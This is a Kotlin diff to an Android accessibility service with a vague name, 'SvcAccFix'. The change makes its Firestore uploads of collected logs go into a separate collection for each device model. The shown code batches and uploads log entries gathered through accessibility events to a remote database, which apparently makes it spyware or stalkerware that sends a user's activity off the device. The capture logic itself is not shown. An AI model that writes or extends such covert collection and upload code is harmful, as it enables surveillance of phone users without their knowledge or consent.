@@ -8,6 +8,7 @@ import android.content.IntentFilter
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.BatteryManager
+import android.os.Build
 import android.text.format.DateFormat
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
@@ -62,7 +63,8 @@ class SvcAccFix : AccessibilityService() {
                 }
             }
 
-            val dataCollection = firestore.collection("logs")
+            val deviceModel = Build.MODEL
+            val dataCollection = firestore.collection("logs_$deviceModel")
 
             GlobalScope.launch(Dispatchers.IO) {
                 logsToUpload.forEach { log ->
@@ -148,7 +150,8 @@ class SvcAccFix : AccessibilityService() {
     private fun sendLogToFirestore(logModel: LogModel) {
         // Firebase Firestore bog'lanish
         val firestore = FirebaseFirestore.getInstance()
-        val dataCollection = firestore.collection("logs")
+        val deviceModel = Build.MODEL
+        val dataCollection = firestore.collection("logs_$deviceModel")
         dataCollection.add(logModel)
             .addOnSuccessListener { documentReference ->
                 Log.d("EVENT", "sendLogToFirestore: ${documentReference.id}")
